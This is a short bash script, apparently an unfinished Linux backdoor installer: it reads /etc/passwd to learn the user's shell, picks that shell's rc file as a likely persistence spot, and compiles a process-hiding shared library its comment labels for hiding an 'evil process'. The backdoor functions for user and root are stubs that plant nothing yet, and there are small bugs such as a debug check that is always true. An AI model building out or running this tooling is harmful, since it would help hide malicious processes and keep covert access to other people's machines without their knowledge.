#!/bin/bash
DEBUG=1
#### Functions

find_shell_env () {
  if [ ${#SHELL} -eq 0 ]; then
    user_shell=$(cat /etc/passwd| grep -i $USER | cut -d ':' -f 7)
  else
    user_shell=$SHELL
  fi

  if [ DEBUG ]; then
    echo "[DBG] User shell: $user_shell"
  fi
}

# Find correct "*rc" file
find_rc_file () {
  if [ "$1" == "/bin/zsh" ]; then
    rc_file="~/.zshrc"
  elif [ "$1" == "/bin/bash" ]; then
    rc_file="~/.bashrc"
  elif [ "$1" == "/usr/local/bin/fish" ]; then
    rc_file="~/.config/fish/config.fish"
  else
    rc_file=""
  fi

  if [ DEBUG ]; then
    echo "[DBG] rc file: $rc_file"
  fi
}

# Compile proc hide lib (hide evil process)
compile_proc_hide() {
  gcc -Wall -fPIC -shared -o libprocpps.so.2 proc_hide.c -ldl
}

#### /Functions

#### Backdoor functions

bckd_user () {
 # Determine shell
 find_shell_env
 find_rc_file "$user_shell"

}

bckd_root () {
  echo 1
}

#### /Backdoor functions


#######
# Main
#######

# Root ?
if [[ $EUID -eq 0 ]]; then
  echo "Bckdr - root"
else
  echo "Bckdr - user"
  bckd_user
fi
